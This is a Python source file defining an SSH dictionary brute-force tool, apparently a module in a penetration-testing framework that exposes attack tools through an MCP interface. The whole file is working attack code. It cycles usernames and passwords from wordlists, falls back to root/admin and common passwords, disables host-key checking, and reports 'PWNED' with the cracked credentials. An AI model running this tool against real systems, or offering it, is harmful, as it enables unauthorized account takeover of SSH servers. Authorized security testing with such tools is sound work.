import paramiko
import time
import os
from core.mcp_protocol import MCPTool


class SSHCracker(MCPTool):
    def __init__(self, project_id, guardian):
        super().__init__(
            name="SSH Brute Force",
            description="Ataque de diccionario a servicio SSH",
            mitre_id="T1110",
            project_id=project_id,
            guardian=guardian,
        )
        self.user_list_path = os.path.join("data", "wordlists", "usuarios.txt")
        self.pass_list_path = os.path.join("data", "wordlists", "claves.txt")

    def _get_list(self, path, limit=10):
        """Lee archivo y devuelve los primeros N elementos para no saturar"""
        items = []
        if os.path.exists(path):
            try:
                with open(path, "r", encoding="utf-8", errors="ignore") as f:
                    for i, line in enumerate(f):
                        if i >= limit:
                            break
                        if line.strip():
                            items.append(line.strip())
            except:
                pass

        # Fallbacks si los archivos están vacíos o no existen
        if not items:
            return ["root", "admin"] if "usuarios" in path else ["123456", "password"]
        return items

    def _execute(self, target_ip, port=22):
        # Cargamos listas limitadas
        users = self._get_list(self.user_list_path, limit=5)  # Top 5 usuarios
        passwords = self._get_list(self.pass_list_path, limit=20)  # Top 20 claves

        print(f"[*] 🔓 Iniciando SSH Brute Force contra {target_ip}")
        print(f"    👥 Usuarios: {len(users)} | 🔑 Claves: {len(passwords)}")
        print(f"    🎲 Total Intentos: {len(users) * len(passwords)}")

        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())  # nosec

        cracked = []

        for user in users:
            for pwd in passwords:
                try:
                    # Intentar conexión
                    client.connect(
                        target_ip, port=port, username=user, password=pwd, timeout=2
                    )

                    # Si no hay excepción, entramos
                    print(f"    🔥 CRACKED! -> {user}:{pwd}")
                    self.save_finding(
                        title="Weak SSH Credentials",
                        target=target_ip,
                        evidence=f"User: {user} | Pass: {pwd}",
                        severity="Critical",
                        cvss_score=9.8,
                    )
                    cracked.append(f"{user}:{pwd}")
                    client.close()
                    return {
                        "status": "PWNED",
                        "credentials": cracked,
                    }  # Paramos al primer éxito

                except paramiko.AuthenticationException:
                    pass  # Clave incorrecta
                except Exception as e:
                    # Error de red (Timeouts, Host down)
                    print(f"    ⚠️ Error de red ({user}): {str(e)}")
                    return {"status": "ERROR", "details": str(e)}

                # Pausa para no ser detectado como DoS
                # time.sleep(0.1)

        return {"status": "FINISHED", "cracked": False}
